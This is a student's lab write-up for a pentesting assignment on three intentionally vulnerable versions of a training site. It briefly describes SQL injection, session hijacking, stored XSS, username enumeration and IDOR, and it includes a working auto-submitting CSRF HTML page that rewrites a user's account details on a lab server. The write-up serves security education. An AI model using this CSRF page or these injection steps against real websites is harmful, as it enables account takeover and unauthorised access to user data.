# Project 8 - Pentesting Live Targets

Time spent: **4** hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:
* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each version of the site has been given two of the six vulnerabilities. (In other words, all six of the exploits should be assignable to one of the sites.)

## Blue

Vulnerability #1: SQL Injection <br>
![alt text](https://media.giphy.com/media/1TSvbf5ZI6GsKLOnqb/giphy.gif) <br>
* Visit salesperson page
* Inject SQL via the ID param in the URL
* Using SLEEP(X) causes the page to hang up for X amounts of seconds (usually more)

Vulnerability #2: Session Hijacking/Fixation <br>
![alt text](https://media.giphy.com/media/3CU2S0KVAjfcsqqIwq/giphy.gif) <br>
* Log in as real user
* Attacker gets session ID because it expires after a year
* Attacker changes their session ID to match the captured one
* They now have access to user's information and potential sensitive data


## Green

Vulnerability #1: XSS <br>
![alt text](https://media.giphy.com/media/jnUHrqpF66ImA4rAq5/giphy.gif) <br>
* Leave some malicious code in the feedback site as an unauthorized user
* When an authorized user views the feedback page, the code will run

Vulnerability #2: Username Enumeration <br>
![alt text](https://media.giphy.com/media/2sYcDF2QBcg6ciRPS6/giphy.gif) <br>
When trying to log in to the site with a user name that does not exist, like "user", you get a message saying "Log in was unsuccessful.". When you try to sign in with a username that does exist but you use an incorrect password, you get the same message but bolded. This tells a potential attack that a user with this username exists and they can start trying to crack their password. 


## Red

Vulnerability #1: IDOR <br>
![alt text](https://media.giphy.com/media/5Wih4zJP9pRNkrMJ9p/giphy.gif) <br>
When viewing "/salesperson.php", there is an ID parameter attached to url. You can easily change this and increase the numbers to access different salespeople. This isn't a huge deal considering the nature of the information, and both blue and green have the same issue. The issue with the red page is that the last two IDs before you start getting redirected contain sensitive information. 

Vulnerability #2: CSRF <br>
![alt text](https://media.giphy.com/media/1Ye2OI5RXZfIVkjwuu/giphy.gif) <br>
By putting a link to a file in the feedback section, I am able to take advantage of a CSRF vulnerablity in the website. This allows me edit the information about a given user. I can change their username, email, the name they show up as, and their password with this vulnerability. Below is the html that was used. <br>
```html
<!DOCTYPE html>
<html>
<body onload="onload()">
    <form action="https://35.184.88.145/red/public/staff/users/edit.php?id=1" method="post" id="sonic" style="display: none" target="res">
        <input type="text" name="first_name" value="Sonic"><br>
        <input type="text" name="last_name" value="the Hedgehog"><br>
        <input type="text" name="username" value="gottagofast"><br>
        <input type="text" name="email" value="goingfast@speed.com"><br>
        <input type="submit" value="Update">
    </form>
    <iframe name="res" style="display: none;"></iframe>
</body>
    
<script>
    function onload() {
        document.getElementById('sonic').submit();
    }
</script>
</html>
```


## Notes

The biggest dificulty that I had was the CSRF vulnerability. I knew that it existed on one of the sites and I knew what I had to find which site it was, but it was still very difficult because of the way the form needed to be structured. I had to have an iframe so that the form wouldn't just disappear on load. That was one of my first problems, my other involved the submit button. I needed the form to autosubmit, but because the submit button was named "submit", .submit() would not would not work. More details on that specific issue [here](https://trackjs.com/blog/when-form-submit-is-not-a-function/)

